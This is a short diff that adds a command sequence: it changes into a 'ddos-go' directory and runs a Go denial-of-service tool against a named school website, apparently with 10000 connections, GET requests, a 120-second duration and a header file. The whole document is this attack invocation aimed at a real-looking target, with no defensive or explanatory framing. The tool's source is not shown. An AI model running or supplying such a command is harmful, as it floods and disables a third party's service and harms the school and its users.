@@ -1,0 +1,5 @@
+cd ddos-go
+
+go run ddos.go http://nguyenthidinh-tayhoa.phuyen.edu.vn/ 10000 get 120 header.txt
+
+
